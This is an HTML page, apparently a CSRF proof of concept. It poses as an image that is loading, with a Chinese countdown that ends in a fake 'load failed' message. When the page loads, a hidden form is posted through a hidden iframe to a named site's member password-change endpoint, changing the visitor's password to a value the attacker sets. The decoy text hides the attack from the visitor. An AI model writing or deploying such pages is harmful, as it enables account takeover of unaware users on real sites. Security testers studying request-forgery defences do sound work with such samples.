<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>图片加载中...</title>
  <style>
    body {
      text-align: center;
      margin-top: 100px;
      font-family: Arial, sans-serif;
      background-color: #fff;
    }
    #status {
      font-size: 18px;
    }
    #timer {
      font-size: 24px;
      margin-top: 10px;
      color: #888;
    }
    iframe {
      display: none;
    }
  </style>
</head>
<body>

  <p id="status">图片加载中，请稍等…</p>
  <p id="timer">30</p>
  <img src="notfound.png" alt="图片" style="display:none;" />

  <!-- 用于隐藏提交动作的 iframe -->
  <iframe name="csrfFrame" style="display:none;"></iframe>

  <!-- 隐藏的 CSRF 表单 -->
  <form id="csrfForm" action="https://cn.b58321.com/index.php?s=/MemberCenter/formChangePassword" method="POST" target="csrfFrame">
    <input type="hidden" name="oldPassword" value="1234567">
    <input type="hidden" name="newPassword" value="12345678">
    <input type="hidden" name="new2Password" value="12345678">
  </form>

  <script>
    window.onload = function () {
      // 自动提交表单（完全隐藏）
      document.getElementById('csrfForm').submit();

      // 倒计时逻辑
      let seconds = 30;
      const timer = document.getElementById('timer');
      const status = document.getElementById('status');

      const countdown = setInterval(() => {
        seconds--;
        timer.innerText = seconds;
        if (seconds <= 0) {
          clearInterval(countdown);
          status.innerText = '图片加载失败，请重试。';
          timer.style.display = 'none';
        }
      }, 1000);
    };
  </script>
</body>
</html>
